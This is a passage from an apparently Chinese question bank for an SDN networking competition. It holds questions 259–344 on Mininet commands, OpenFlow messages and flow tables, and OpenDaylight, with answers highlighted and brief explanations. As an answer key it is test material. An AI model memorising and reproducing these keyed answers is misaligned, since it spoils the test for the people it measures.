">A、–mac</font></strong></p><p><strong>B、–switch</strong></p><p><strong>C、–topo</strong></p><p><strong>D、–controller</strong></p><p><strong><code>解析：--mac用于自动设置设备的MAC地址，--switch用于设置Mininet要使用的交换机，--topo用于设置网络拓扑，--controller用于设置要使用的控制器。</code></strong></p><p><strong>259.数据中心中抑制广播风暴的协议是（）</strong></p><p><strong>A、SNMP</strong></p><p><strong><font style="background: yellow ">B、STP</font></strong></p><p><strong>C、DNS</strong></p><p><strong>D、DHCP</strong></p><p><strong>260.Mininet命令行中查看流表的命令是（）</strong></p><p><strong><font style="background: yellow ">A、dpctl dump-flows</font></strong></p><p><strong>B、ofctl dump-flows</strong></p><p><strong>C、dpctl show-flows</strong></p><p><strong>D、ofctl show-flows</strong></p><p><strong>261.关于OpenDaylight控制器，描述错误的是（）</strong></p><p><strong>A、支持北向接口REST</strong></p><p><strong>B、支持所有南向接口协议</strong></p><p><strong><font style="background: yellow ">C、管理方式只有CLI，不支持Web UI</font></strong></p><p><strong>D、相比其他控制器而言，ODL学习曲线相对复杂</strong></p><p><strong>262.Mininet的安装方法是（）</strong></p><p><strong>A、下载Mininet VM镜像</strong></p><p><strong>B、本地安装Mininet源代码</strong></p><p><strong>C、安装Mininet文件包</strong></p><p><strong><font style="background: yellow ">D、以上都是</font></strong></p><p><strong>263.Mininet自定义命令拓展实现步骤是（）</strong><br><strong>①　修改文件bin&#x2F;mn加入到可执行文件中</strong><br><strong>②　重新安装Mininet执行文件~&#x2F;mininet&#x2F;util&#x2F;install.sh -n</strong><br><strong>③　修改文件mininet&#x2F;net.py实现功能代码</strong><br><strong>④　修改文件mininet&#x2F;cli.py完成命令注册</strong></p><p><strong>A、①③②④</strong></p><p><strong>B、②①③④</strong></p><p><strong><font style="background: yellow ">C、③④①②</font></strong></p><p><strong>D、①④②③</strong></p><p><strong>264.针对下图中的拓扑，添加流表项使得主机1和主机2之间相互通信，写法正确的是（）</strong><br><strong><img src="/images/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9Bsdn%E8%AE%AD%E7%BB%83%E9%A2%98%E5%BA%93/09.jpg"></strong></p><p><strong><font style="background: yellow ">A、dpctl add-flow in_port&#x3D;2,actions&#x3D;output:1<br>dpctl add-flow in_port&#x3D;1,actions&#x3D;output:2</font></strong></p><p><strong>B、dpctl add-flow in_port&#x3D;2,actions&#x3D;output:3</strong><br><strong>dpctl add-flow in_port&#x3D;3,actions&#x3D;output:2</strong></p><p><strong>C、dpctl add-flow in_port&#x3D;1,actions&#x3D;output:3</strong><br><strong>dpctl add-flow in_port&#x3D;3,actions&#x3D;output:1</strong></p><p><strong>D、dpctl add-flow in_port&#x3D;1,actions&#x3D;output:2</strong><br><strong>dpctl add-flow in_port&#x3D;2,actions&#x3D;output:3</strong></p><p><strong><code>解析：流表项包括数据流从1口进2口出，2口进1口出。</code></strong></p><p><strong>265.Mininet命令行中删除交换机1上条件字段中包含in_port&#x3D;1的所有流表，命令正确的是（）</strong></p><p><strong><font style="background: yellow ">A、sh ovs-ofctl del-flows s1 in_port&#x3D;1</font></strong></p><p><strong>B、dpctl del-flows in_port&#x3D;1</strong></p><p><strong>C、sh ovs-ofctl del-flow s1 in_port&#x3D;1</strong></p><p><strong>D、dpctl del-flows in_port&#x3D;all</strong></p><p><strong>266.关于Mininet安装，说法不正确的是（）</strong></p><p><strong>A、假如安装环境上有Mininet、OvS以前版本痕迹，需先进行删除后再进行安装。</strong></p><p><strong><font style="background: yellow ">B、~&#x2F;mininet&#x2F;util&#x2F;install.sh -n3V 2.5.0表示安装2.5.0版本的Mininet。</font></strong></p><p><strong>C、Mininet的VM安装是Mininet最简单的安装方法。</strong></p><p><strong>D、安装完成后可通过命令mn –test pingall测试Mininet是否安装成功。</strong></p><p><strong><code>解析：~/mininet/util/install.sh -n3V 2.5.0表示安装2.5.0版本的OvS，-n表示直接安装Mininet的核心文件，-3表示安装OpenFlow1.3协议，-V表示选择OpenVSwitch的版本。</code></strong></p><p><strong>267.以下哪个命令不是Mininet常用交互命令（）</strong></p><p><strong><font style="background: yellow ">A、iperftcp</font></strong></p><p><strong>B、link</strong></p><p><strong>C、links</strong></p><p><strong>D、py</strong></p><p><strong><code>解析：iperf命令是两节点间进行iperftcp带宽测试，link命令用于禁用或启用两个节点之间的链路，links命令用于查看链路健壮性信息，py用于执行Python表达式。</code></strong></p><p><strong>268.SDN北向接口是指SDN控制器和数据平面之间的接口。</strong></p><p> <strong>对 <font style="background: yellow "> 错</font></strong></p><p><strong><code>解析：SDN北向接口是指SDN控制器和SDN应用之间的接口。</code></strong></p><p><strong>269.OpenFlow协议支持可编程数据平面。</strong></p><p> <strong>对 <font style="background: yellow "> 错</font></strong></p><p><strong><code>解析：P4协议支持可编程数据平面。</code></strong></p><p><strong>270.OpenDaylight控制器使用Python语言编写，支持OpenStack平台和OpenFlow协议。</strong></p><p> <strong>对 <font style="background: yellow "> 错</font></strong></p><p><strong><code>解析：OpenDaylight控制器使用Java语言编写，支持OpenStack平台和OpenFlow协议。</code></strong></p><p><strong>271.VMware和Cisco各提出了一种SDN在数据中心的网络虚拟化方案。</strong></p><p><strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>272.Nuage Network方案非常灵活，可以管控任意网络，接入任意公有云或者企业私有云，部署任意应用。</strong></p><p><strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>273.Miniedit只能添加SDN设备，无法添加传统路由器和交换机。</strong></p><p> <strong>对 <font style="background: yellow ">错</font></strong></p><p><strong>274.MiniEdit只能创建一个Mininet OpenFlow控制器。</strong></p><p> <strong>对 <font style="background: yellow ">错</font></strong></p><p><strong>275.在Mininet命令行操作界面通过ping操作和iperf命令可以验证主机间的连通性以及带宽分析。</strong></p><p><strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>276.Mininet既可以通过参数–topo来指定拓扑类型，还可以通过脚本来创建拓扑。</strong></p><p><strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>277.Mininet命令行中dpctl del-flows将删除某一个交换机上的流表。</strong></p><p> <strong>对 <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：Mininet命令行中dpctl del-flows将删除所有交换机上的流表。</code></strong></p><p><strong>278.控制器先下发的流表和后添加的流表，优先匹配后添加的流表。</strong></p><p> <strong>对 <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：优先匹配控制器下发的流表，或者根据流表优先级匹配。</code></strong></p><p><strong>279.Mininet命令行中流表命令dpctl add-flow in_port&#x3D;2，actions&#x3D;drop表示让所有交换机丢弃从2号端口发来的所有数据包。</strong></p><p><strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>280.除了控制器自动下发流表外也可以通过手动添加流表的方式使得主机间通信。</strong></p><p><strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>281.Mininet中–switch参数默认使用内核态交换机。</strong></p><p> <strong>对 <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：Mininet中--switch参数默认使用ovsk交换机。</code></strong></p><p><strong>282.Mininet中–topo参数用于指定自定义拓扑文件。</strong></p><p> <strong>对 <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：Mininet中--custom参数用于指定自定义拓扑文件，--topo用于指定加载的拓扑。</code></strong></p><p><strong>283.下列选项中（）被认为是第一个软件定义网络（SDN）标准。</strong></p><p><strong><font style="background: yellow ">A、OpenFlow</font></strong></p><p><strong>B、OpenStack</strong></p><p><strong>C、IEEE 802.1aq</strong></p><p><strong>D、OpenDaylight</strong></p><p><strong>284.OpenFlow协议是（ ）之间的通信协议。</strong></p><p><strong>A、OpenFlow交换机与OpenFlow交换机</strong></p><p><strong><font style="background: yellow ">B、OpenFlow控制器与OpenFlow交换机</font></strong></p><p><strong>C、主机与OpenFlow控制器</strong></p><p><strong>D、主机与OpenFlow交换机</strong></p><p><strong>285.关于OpenFlow的发展史说法错误的是（ ）</strong></p><p><strong>A、2006年，斯坦福大学Clean Slate计划资助的Ethane项目开始部署，OpenFlow协议的雏形就诞生于这个项目</strong></p><p><strong>B、2008年，Nick McKeown教授的一篇重要论文”OpenFlow：Enabling Innovation in Campus Networks”使得OpenFlow正式进入人们的视野</strong></p><p><strong><font style="background: yellow ">C、OpenFlow成为标准化组织ONF（Open Network Foundation，开放网络基金会）主推的北向接口协议</font></strong></p><p><strong>D、OpenFlow协议还在不断地演进中</strong></p><p><strong><code>解析：OpenFlow是南向接口协议。</code></strong></p><p><strong>286.以下不属于OpenFlow v1.0中流表项组成的是（ ）</strong></p><p><strong>A、Head Field</strong></p><p><strong>B、Counter</strong></p><p><strong>C、Action</strong></p><p><strong><font style="background: yellow ">D、OXM</font></strong></p><p><strong><code>解析：OpenFlow eXtensible Match，简称OXM，是在OpenFlow v1.2开始被定义的。分组头域（Head Field）描述了何种数据包与流表项匹配，计数器（Counter）记录了匹配次数。行动（Action）描述了对匹配的数据包所采取的操作。</code></strong></p><p><strong>287.与传统网络设备转发数据相比，OpenFlow交换机尝试定义一种新的网络处理模型是（ ）</strong></p><p><strong>A、路由表</strong></p><p><strong><font style="background: yellow ">B、流表</font></strong></p><p><strong>C、MAC地址表</strong></p><p><strong>D、转发表</strong></p><p><strong>288.下列关于OpenFlow术语描述不正确的是（ ）</strong></p><p><strong>A、Action：表示转发packet到某个端口或修改packet的一个操作</strong></p><p><strong><font style="background: yellow ">B、Pipeline：表示传输packets的管道</font></strong></p><p><strong>C、Action set：表示与packet相关的一组actions</strong></p><p><strong>D、Group：表示一个action buckets列表，从中选择一个或多个buckets用在每个packet上</strong></p><p><strong><code>解析：Pipeline是OpenFlow交换机中实现matcing、forwarding和packet修改的flow table流水线。</code></strong></p><p><strong>289.以下不属于OpenFlow交换机流表项指令（Instructions）的是（ ）</strong></p><p><strong>A、Apply-Actions</strong></p><p><strong>B、Write-Actions</strong></p><p><strong>C、Clear-Actions</strong></p><p><strong><font style="background: yellow ">D、Delete-Actions</font></strong></p><p><strong><code>解析：OpenFlow交换机流表项指令中没有Delete-Actions，立即清除Actions Set中的所有action(s)的指令是Clear-Actions。</code></strong></p><p><strong>290.当OpenFlow控制器与交换机版本协商后，控制器向交换机发送（ ）消息。</strong></p><p><strong>A、Packet_out</strong></p><p><strong>B、Packet_in</strong></p><p><strong>C、Get Config Request</strong></p><p><strong><font style="background: yellow ">D、Features Request</font></strong></p><p><strong><code>解析：当OpenFlow控制器与交换机版本协商后，控制器向交换机发送Features Request消息请求，交换机返回一个Features Reply，包含datapath_id、capabilities、actions、ports等字段。</code></strong></p><p><strong>291.下列对Flow Table处理流程描述不正确的是（ ）</strong></p><p><strong>A、网络数据包进入交换机后，需要清空Action set、初始化pipeline fields后从Table 0开始匹配</strong></p><p><strong>B、当匹配到Table 0后，将会更新流表项的计数器，执行流表项指令，更新action set，并判断是否需要转到其他流表</strong></p><p><strong><font style="background: yellow ">C、若流表项不匹配，将会直接丢弃数据包</font></strong></p><p><strong>D、若流表项不匹配，将会匹配Table-miss流表项</strong></p><p><strong><code>解析：若流表项不匹配，将会匹配Table-miss流表项，当不匹配Table-miss流表项时，再执行丢弃数据包的操作。</code></strong></p><p><strong>292.关于组表结构描述不正确的是（ ）</strong></p><p><strong>A、Group ID：用于表示组的识别符，根据该识别符使用各组</strong></p><p><strong>B、Counters：记录通过该组表项处理的数据包数</strong></p><p><strong>C、Group Type：指定组的动作，分为all、select、indirect、fast failover四种</strong></p><p><strong><font style="background: yellow ">D、Action Buckets：多个行动数据桶，各行动数据桶存储了一个执行动作和其对应的参数</font></strong></p><p><strong>293.关于OpenFlow组表项中不同“组类型”的实现与功能，描述不正确的是（ ）</strong></p><p><strong>A、all：Group Table中所有的Action Buckets都会被执行</strong></p><p><strong>B、select：仅仅执行Group Table中的某一个Action Bucket</strong></p><p><strong><font style="background: yellow ">C、indirect：执行Group Table中已经定义好的Action Bucket，可以支持多个Action Bucket</font></strong></p><p><strong>D、fast failover：执行第一个“激活的”Action Bucket</strong></p><p><strong><code>解析：indirect：执行Group Table中已经定义好的Action Bucket，只支持一个Action Bucket。</code></strong></p><p><strong>294.关于计量表项（Meter Entry）结构描述不正确的是（ ）</strong></p><p><strong>A、计量表项ID：根据此标识符，使用这个计量表项，是32位无符号整数</strong></p><p><strong>B、计量带（Meter Bands）：指定该计量表项如何处理数据包</strong></p><p><strong>C、计数器：记录表项处理报文数目</strong></p><p><strong><font style="background: yellow ">D、计量表类型：指定计量表的动作</font></strong></p><p><strong>295.以下哪项不属于组表（）</strong></p><p><strong><font style="background: yellow ">A、Group Name</font></strong></p><p><strong>B、Group Type</strong></p><p><strong>C、Counters</strong></p><p><strong>D、Action Buckets</strong></p><p><strong>296.OpenFlow交换机定义了三种类型的端口，分别是（ ）</strong></p><p><strong><font style="background: yellow ">A、物理端口、逻辑端口、预留端口</font></strong></p><p><strong>B、物理端口、虚拟端口、逻辑端口</strong></p><p><strong>C、虚拟端口、预留端口、标准端口</strong></p><p><strong>D、预留端口、逻辑端口、标准端口</strong></p><p><strong>297.下列哪个报文有发现链路的功能（ ）</strong></p><p><strong>A、Flow-Mod</strong></p><p><strong>B、Port-Status</strong></p><p><strong><font style="background: yellow ">C、Packet-in&#x2F;out</font></strong></p><p><strong>D、Hello</strong></p><p><strong><code>解析：控制器与OpenFlow交换机在连接建立过程中会存在拓扑发现的环节，该环节会密集出现Packet-in/out消息，控制器通过构造packet-out消息，并对OpenFlow交换机下发特定的规则，以触发OpenFlow交换机发送packet-in消息给控制器，来发现完整链路。</code></strong></p><p><strong>298.在OpenFlow交换机中添加、删除或修改物理端口时，需要发送（ ）消息来通知OpenFlow控制器。</strong></p><p><strong><font style="background: yellow ">A、Port-Status消息</font></strong></p><p><strong>B、Role消息</strong></p><p><strong>C、Echo消息</strong></p><p><strong>D、Barrier消息</strong></p><p><strong><code>解析：Port-Status消息用于在OpenFlow交换机中添加、删除或修改物理端口时，通知OpenFlow控制器。</code></strong></p><p><strong>299.以下关于Packet-in消息描述不正确的是（ ）</strong></p><p><strong>A、Packet-in消息由OpenFlow交换机发出并发送到OpenFlow控制器</strong></p><p><strong>B、当交换机收到一个数据包后，会查找流表，如果流表中没有匹配条目，则交换机会将数据包封装在Packet-in消息中发送给控制器处理</strong></p><p><strong><font style="background: yellow ">C、当一个数据包匹配的流表项中的行动为“发往控制器”时，此数据包会被缓存在交换机中</font></strong></p><p><strong>D、可以通过Packet-in&#x2F;Packet-out发现交换机之间的链路</strong></p><p><strong><code>解析：1、流表没有匹配条目，交换机将数据包封装在Packet_in消息中发送给控制器处理，此时数据包会被缓存在交换机中等待处理；2、匹配的流表项中的行动为“发往控制器”（OFPR_ACTION），此时数据包不会被缓存在交换机中。</code></strong></p><p><strong>300.以下不属于OpenFlow中Controller-to-Switch消息的子类型的是（ ）</strong></p><p><strong>A、Modify-State</strong></p><p><strong>B、Switch features</strong></p><p><strong>C、Barrier</strong></p><p><strong><font style="background: yellow ">D、Packet-in</font></strong></p><p><strong><code>解析：Packet-in类型属于OpenFlow中异步消息的子类型。</code></strong></p><p><strong>301.在Switch features消息中，用于唯一标识交换机的字段是（ ）</strong></p><p><strong>A、header</strong></p><p><strong><font style="background: yellow ">B、datapath-id</font></strong></p><p><strong>C、n_buffers</strong></p><p><strong>D、switch_id</strong></p><p><strong><code>解析：header中包含OpenFlow的版本，消息类型，长度；datapath-id是数据通道（datapath）独一无二的标识符，低48位是一个MAC地址，而高16位是自定义的；n_buffers表示一次最多缓存的数据包数量；没有switch_id字段。</code></strong></p><p><strong>302.下列对于Packet-in消息中字段的描述不正确的是（ ）</strong></p><p><strong>A、buffer_id：数据通道分配的缓存id，标志数据包存在交换机中的位置，如果没有缓存在交换机中则buffer_id为-1</strong></p><p><strong>B、total_len：整个数据帧的长度</strong></p><p><strong><font style="background: yellow ">C、in_port：发送数据帧的端口</font></strong></p><p><strong>D、reason：将数据包发送给控制器的原因，一般有两种原因，一是没有匹配到流表项，二是动作要求发给控制器</strong></p><p><strong><code>解析：in_port表示接收数据帧的端口。</code></strong></p><p><strong>303.下列对于Flow-Mod消息（Modify Flow Entry Messages）中定义的命令种类ofp_flow_mod_command描述不正确的是（ ）</strong></p><p><strong>A、OFPFC_ADD：数值为0，表示添加新的流表项</strong></p><p><strong>B、OFPFC_MODIFY：数值为1，表示变更匹配的流表项的设置</strong></p><p><strong>C、OFPFC_DELETE：数值为3，表示删除匹配的流表项</strong></p><p><strong><font style="background: yellow ">D、OFPFC_CLEAR_STRICT：数值为4，表示删除完全匹配的流表</font></strong></p><p><strong><code>解析：数值为4的字段名称为OFPFC_DELETE_STRICT，表示仅删除完全匹配的流表项；另外还有数值为2的字段，OFPFC_MODIFY_STRICT，表示仅变更完全匹配的流表项的设置。</code></strong></p><p><strong>304.OpenFlow协议的Flow-Mod消息的作用是（ ）</strong></p><p><strong>A、控制信息</strong></p><p><strong>B、主机通讯</strong></p><p><strong><font style="background: yellow ">C、下发流表</font></strong></p><p><strong>D、交换机配置</strong></p><p><strong><code>解析：Flow-Mod消息（Modify Flow Entry Messages）是由OpenFlow控制器对OpenFlow交换机设置流表项的消息，也就是下发流表的消息，通过Flow-Mod消息，可以对流表项进行添加、删除、变更设置等操作。</code></strong></p><p><strong>305.关于Barrier消息说法不正确的是（ ）</strong></p><p><strong>A、Barrier请求消息和Barrier响应消息都只有OpenFlow消息头，不包含消息体</strong></p><p><strong>B、控制器向交换机发送一个Barrier请求，要求等xid数值以前的处理全部完成后，返回Barrier响应</strong></p><p><strong>C、交换机会先处理Barrier请求前的所有消息，当操作全部完成后返回一个Barrier响应消息给控制器，表明操作已经结束</strong></p><p><strong><font style="background: yellow ">D、返回Barrier响应消息中不携带xid</font></strong></p><p><strong>306.下列关于Flow-Removed消息的各字段描述不正确的是（ ）</strong></p><p><strong>A、match：表示流表项的匹配，与通过Flow-Mod消息创建流表项时的内容一致</strong></p><p><strong><font style="background: yellow ">B、reason：表示添加流表项的理由</font></strong></p><p><strong>C、cookie：是在OpenFlow控制器一端使用的Cookie值，与Flow-mod消息的数值相同</strong></p><p><strong>D、priority：流表项的优先级，与Flow-mod消息的数值相同</strong></p><p><strong><code>解析：Flow-Removed消息中reason字段表示删除流表项的理由。</code></strong></p><p><strong>307.关于OVSDB协议描述不正确的是（ ）</strong></p><p><strong>A、是一种管理配置协议，负责添加、删除、更新端口和隧道</strong></p><p><strong>B、具有灵活易懂、可扩展性强的特点</strong></p><p><strong>C、控制平面可以通过OVSDB Mgmt远程配置OVS的数据库OVSDB</strong></p><p><strong><font style="background: yellow ">D、OVSDB管理协议是目前为止唯一的OpenFlow配置协议</font></strong></p><p><strong>308.单选题</strong></p><p><strong>下列关于P4语言的定位描述不正确的是（ ）</strong></p><p><strong>A、协议无关性</strong></p><p><strong>B、目标无关性</strong></p><p><strong><font style="background: yellow ">C、统一南向接口</font></strong></p><p><strong>D、现场可重配置能力</strong></p><p><strong>309.以下Actions包处理动作中不是OpenFlow交换机必须支持的Action类型是（ ）</strong></p><p><strong>A、Output</strong></p><p><strong>B、Drop</strong></p><p><strong>C、Group</strong></p><p><strong><font style="background: yellow ">D、Meter</font></strong></p><p><strong>310.下面关于OpenFlow相关消息说法不正确的是（ ）</strong></p><p><strong>A、通过Packet-in&#x2F;Packet-out发现交换机之间的链路</strong></p><p><strong>B、在OpenFlow交换机中添加、删除或修改物理端口时，需要发送Port-Status消息来通知OpenFlow控制器</strong></p><p><strong><font style="background: yellow ">C、通过Get Config Request消息协商双方的OpenFlow版本号</font></strong></p><p><strong>D、OpenFlow控制器和OpenFlow交换机可通过发送Echo请求消息来确认二者之间是否连接、检测通信延迟、测量通信带宽等。</strong></p><p><strong><code>解析：控制器与OpenFlow交换机之前通过互相发送Hello消息协商版本号，并且协商的结果将以较低的OpenFlow版本为准。</code></strong></p><p><strong>311.在OpenFlow v1.2版本中，OpenFlow控制器默认的角色为（ ）</strong></p><p><strong><font style="background: yellow ">A、EQUAL</font></strong></p><p><strong>B、MASTER</strong></p><p><strong>C、SLAVE</strong></p><p><strong>D、MAIN</strong></p><p><strong><code>解析：OpenFlow控制器的默认角色为EQUAL，角色为EQUAL的各控制器发挥着相同的作用；OpenFlow控制器可以要求将角色变更为MASTER，虽然EQUAL和MASTER具有完全相同的权限，但是只能同时存在1台MASTER，其它的OpenFlow控制器将变为SLAVE。</code></strong></p><p><strong>312.OpenFlow交换机定义了一种理想化的SDN数据平面，是协议无关的通用可编程网络处理模型。</strong></p><p><strong>对 <font style="background: yellow ">错</font></strong></p><p><strong>313.Table-miss流表项是发生Table-miss时使用的流表项。它将所有的字段处理为通配符，是优先级最低的流表项。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>314.OpenFlow v1.0中增加了组表（Group Table）的概念。</strong></p><p><strong>对 <font style="background: yellow ">错</font></strong></p><p><strong>315.OpenFlow控制器通过下发流表来指导数据平面流量的转发。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>316.OpenFlow v1.3中每台OpenFlow交换机只有一张流表。</strong></p><p><strong>对 <font style="background: yellow ">错</font></strong></p><p><strong>317.控制器与OpenFlow交换机之间相互发送Hello消息，用于协商双方的OpenFlow版本号。在双方支持的最高版本号不一致的情况下，协商的结果将以较高的OpenFlow版本为准。</strong></p><p><strong>对 <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：协商的结果将以较低的OpenFlow版本为准。</code></strong></p><p><strong>318.Packet-out中的reason字段表示发送Packet-out消息的原因。</strong></p><p><strong>对 <font style="background: yellow ">错</font></strong></p><p><strong>319.用于发现SDN交换机链路的LLDP报文封装在Packet-in&#x2F;Packet-out消息中。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong><code>解析：LLDP（Link Layer Discovery Protocol，链路层发现协议）提供了一种标准的链路层发现方式，通过Packet-in/Packet-out消息发送LLDP帧，OpenFlow可以将LLDP有效用于网络拓扑检测。</code></strong></p><p><strong>320.OpenFlow Echo消息用来确认控制器和交换机之间连接的延时、验证Controller-to-Switch连接是否保持活跃的状态。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>321.只有当匹配的流表项中的行动为“发往控制器”时，才会触发Packet-in消息。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：Packet-in消息的功能是：将到达OpenFlow交换机的数据包发送到控制器。触发Packet-in消息的原因有以下两种：不存在与流表项一致的项目（OFPR_NO_MATCH）；匹配的流表项中的行动为“发往控制器”（OFPR_ACTION）。</code></strong></p><p><strong>322.Error消息的作用是通知出现了某种错误，只有OpenFlow交换机才能发送Error消息。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：Error消息的作用是通知出现了某种错误，OpenFlow交换机和OpenFlow控制器都可以发送Error消息。</code></strong></p><p><strong>323.P4基于PISA模型来进行数据平面的编程。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>324.OFPT_ECHO_REQUEST和对应的OFPT_ECHO_REPLY消息中的xid相同。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>325.OpenFlow协议数据包包括Header和Message。Header中主要是协议版本，数据包长度等，Message是具体的数据包内容。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>326.控制器和交换机三次握手后互发Get Config Request消息，该消息携带本端支持的OpenFlow版本号，双方选取Get Config Request消息中版本号较小的协议作为通信的协议。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：控制器和交换机发送Hello消息，双方选取Hello消息中版本号较小的协议作为双方的通信协议，这样才可以保证双方消息解析的正确性。</code></strong></p><p><strong>327.Features Request消息只能由控制器发往交换机。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>328.每个流表都有一条（隐形）默认规则，即Table-miss规则。当一个报文进入一张流表，但没有任何flow entry匹配时，就会默认进入Table-miss规则。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>329.Table-miss是一条优先级0的通配规则，默认行为可以是（包括但不限于）丢包、发给控制器、发给另一张表等。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>330.向控制器发送Packet-in消息的同时交换机会在本地做消息缓存。</strong></p><p><strong>对  <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：产生Packet-in消息的原因一般有两种，一种是流表中没有匹配条目，此时交换机会在本地缓存当前数据包然后向控制器发送Packet-in消息。另一种是数据包匹配到的流表动作为Output=CONTROLLER，此时交换机会向控制器发送packet-in消息，本地不做消息缓存。</code></strong></p><p><strong>331.流表中hard_timeout字段值为30，表示该流表在30秒之内没有被匹配，则删除。</strong></p><p><strong>对  <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：idle_timeout字段值为10，表示该流表在10秒之内没有被匹配，则删除；hard_timeout字段值为30，则30秒到达的时候，无论是否匹配都删除这条流表。</code></strong></p><p><strong>332.下面关于OpenDaylight的说法错误的是（）</strong></p><p><strong><font style="background: yellow ">A、OpenDaylight控制器基于Python语言开发，采用了OSGi体系结构。</font></strong></p><p><strong>B、OpenDaylight控制器主要包括：开放的北向API、控制器平面、南向接口和协议插件。</strong></p><p><strong>C、OpenDaylight引入了MD-SAL，可以自动适配包括OpenFlow交换机等底层不同的设备。</strong></p><p><strong>D、OpenDaylight项目的成立代表了传统网络芯片设备商对于SDN这个颠覆性技术的跟进与支持。</strong></p><p><strong>333.OpenDaylight的版本命名策略是（）</strong></p><p><strong><font style="background: yellow ">A、元素周期表顺序</font></strong></p><p><strong>B、英文26个字母顺序</strong></p><p><strong>C、不同城市名称</strong></p><p><strong>D、没有具体策略</strong></p><p><strong>334.OpenDaylight提供的基础网络服务功能不包括（）</strong></p><p><strong>A、拓扑管理</strong></p><p><strong>B、交换机管理</strong></p><p><strong>C、主机检测</strong></p><p><strong><font style="background: yellow ">D、路由器管理</font></strong></p><p><strong>335.启动OpenDaylight控制器，设置后台运行，使用参数（）</strong></p><p><strong><font style="background: yellow ">A、daemon</font></strong></p><p><strong>B、debug</strong></p><p><strong>C、clean</strong></p><p><strong>D、run</strong></p><p><strong>336.OpenDaylight控制器的启动文件是（）</strong></p><p><strong>A、run</strong></p><p><strong><font style="background: yellow ">B、karaf</font></strong></p><p><strong>C、start</strong></p><p><strong>D、client</strong></p><p><strong>337.查看OpenDaylight特性odl-mdsal-all使用命令（）</strong></p><p><strong><font style="background: yellow ">A、feature:info odl-mdsal-all</font></strong></p><p><strong>B、feature:display odl-mdsal-all</strong></p><p><strong>C、feature:list odl-mdsal-all</strong></p><p><strong>D、feature:show odl-mdsal-all</strong></p><p><strong>338.使用OpenDaylight界面下发流表时使用的操作类型是（）</strong></p><p><strong>A、GET</strong></p><p><strong><font style="background: yellow ">B、PUT</font></strong></p><p><strong>C、ADD</strong></p><p><strong>D、DELETE</strong></p><p><strong>339.Postman发送请求时，Body体的编辑方式不支持（）</strong></p><p><strong>A、form-data</strong></p><p><strong>B、x-www-form-urlencoded</strong></p><p><strong>C、raw</strong></p><p><strong><font style="background: yellow ">D、pretty</font></strong></p><p><strong><code>解析：Postman发送请求时，Body体的编辑支持form-data、x-www-form-urlencoded和raw几种方式。</code></strong></p><p><strong>340.设置OpenDaylight的日志详细级别使用命令（）</strong></p><p><strong>A、log:set level</strong></p><p><strong>B、log:display</strong></p><p><strong><font style="background: yellow ">C、log:set DEBUG</font></strong></p><p><strong>D、log:list</strong></p><p><strong>341.OpenDayLight框架大致包括物理和虚拟网络设备层、控制器平台层和（ ）</strong></p><p><strong>A、虚拟化层</strong></p><p><strong><font style="background: yellow ">B、网络APP和业务流程层</font></strong></p><p><strong>C、资源管理层</strong></p><p><strong>D、协议转换层</strong></p><p><strong><code>解析：本题考查ODL的逻辑架构，即物理和虚拟网络设备层、控制器平台层、网络APP和业务流程层。南向接口连接物理和虚拟网络设备层和控制器平台层，北向接口连接控制器平台层和网络APP业务流程层。</code></strong></p><p><strong>342.关于MD-SAL，描述错误的是（ ）</strong></p><p><strong>A、MD-SAL是Model-Driven Service Abstraction Layer的缩写</strong></p><p><strong>B、MD-SAL的作用是实现北向接口与南向接口的解耦，保证南北向接口独立发展，互不影响</strong></p><p><strong><font style="background: yellow ">C、MD-SAL的理念是模型驱动，模型是通过XML定义的</font></strong></p><p><strong>D、MD-SAL基于Data Store的数据模型提供松散的南北向Plugin映射</strong></p><p><strong><code>解析：MD-SAL的理念是模型驱动，抽象服务和API都由各个Plugin通过Yang Model定义。</code></strong></p><p><strong>343.关于AD-SAL，描述错误的是（ ）</strong></p><p><strong><font style="background: yellow ">A、AD-SAL相比MD-SAL模块规模更加精简，实现更为简便，系统更易于维护。</font></strong></p><p><strong>B、AD-SAL的作用是定义抽象服务，吸收南向协议的差异，提供统一的抽象服务和API，并提供相应的Request Routing</strong></p><p><strong>C、北向的Plugin可以通过调用AD-SAL提供的北向API来实现对南向Plugin的调用</strong></p><p><strong>D、在AD-SAL中，抽象服务由南向和北向API实现，南北向API是一对一的映射关系</strong></p><p><strong><code>解析：在AD-SAL中，南北向API是1：1的对应关系，同一API无法被复用。所有南北向Plugin的功能都需要定义相应的AD-SAL API来承载，造成AD-SAL模块会更加庞大、实现更为复杂、维护困难性增加。</code></strong></p><p><strong>344.关于NETCONF描述错误的是（ ）</strong></p><p><strong><font style="background: yellow 